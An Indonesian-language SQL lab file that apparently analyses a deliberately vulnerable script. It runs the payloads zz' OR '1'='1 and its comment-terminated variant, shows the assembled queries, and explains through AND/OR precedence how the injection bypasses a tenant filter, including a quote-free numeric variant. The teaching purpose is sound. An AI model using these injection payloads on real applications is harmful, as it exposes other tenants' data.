-- Diminta: menjalankan payload pembanding zz' OR '1'='1 lalu zz' OR '1'='1' --, menyalin jumlah
--          baris keduanya, dan menjelaskan mengapa yang pertama 0 baris sedangkan yang kedua
--          mengembalikan seluruh baris.
-- Dipilih: menampilkan teks SQL hasil rakitan dan memeriksa prioritas operator AND/OR, supaya
--          terlihat bahwa sebabnya adalah masukan ikut menyusun kalimat, bukan karakter kutip.
-- Alternatif: menyimpulkan "kutip tunggal itu berbahaya"; tidak dipilih karena salah sasaran:
--             payload tanpa kutip pun berhasil pada konteks numerik (lihat bagian C).

-- ===== Bagian A: dijalankan di kontainer lab11-web (peran koneksi: postgres) =====
--   docker exec -it lab11-web python /app/rentan.py "zz' OR '1'='1"
--   docker exec -it lab11-web python /app/rentan.py "zz' OR '1'='1' --"
--
-- Payload 1 menghasilkan:
--   ... WHERE tenant_id = 1 AND nama ILIKE '%zz' OR '1'='1%'
--   Kutip penutup dan tanda persen bawaan kode menempel di ujung payload, sehingga cabang
--   kedua menjadi '1'='1%' (salah). Cabang pertama juga salah (tidak ada nama berakhiran zz).
-- Payload 2 menghasilkan:
--   ... WHERE tenant_id = 1 AND nama ILIKE '%zz' OR '1'='1' --%'
--   Tanda -- memulai komentar, sisa kode ('%) terbuang, dan cabang kedua menjadi '1'='1'
--   (selalu benar).
-- AND lebih kuat daripada OR, jadi kondisinya terbaca:
--   (tenant_id = 1 AND nama ILIKE '%zz')  OR  ('1'='1')
-- Penyaring tenant_id = 1 ikut tak berguna karena berada di cabang AND.

-- ===== Bagian B: padanan murni SQL (psql sebagai postgres) =====
-- Payload 1 (harapan: 0)
SELECT count(*) AS payload1 FROM lab11.pelanggan
WHERE tenant_id = 1 AND nama ILIKE '%zz' OR '1'='1%';

-- Payload 2 (harapan: 30000; --%' adalah komentar)
SELECT count(*) AS payload2 FROM lab11.pelanggan
WHERE tenant_id = 1 AND nama ILIKE '%zz' OR '1'='1' --%'
;

-- Sebaran per penyewa pada payload 2: bukan hanya penyewa 1 yang terbawa
SELECT tenant_id, count(*) AS baris FROM lab11.pelanggan
WHERE tenant_id = 1 AND nama ILIKE '%zz' OR '1'='1' --%'
GROUP BY 1 ORDER BY 1;

-- ===== Bagian C: sebabnya bukan kutip =====
-- Konteks numerik tidak butuh satu pun kutip, tetapi hasilnya sama (harapan: 30000):
SELECT count(*) AS tanpa_kutip FROM lab11.pelanggan
WHERE tenant_id = 1 AND id = 0 OR 1=1;
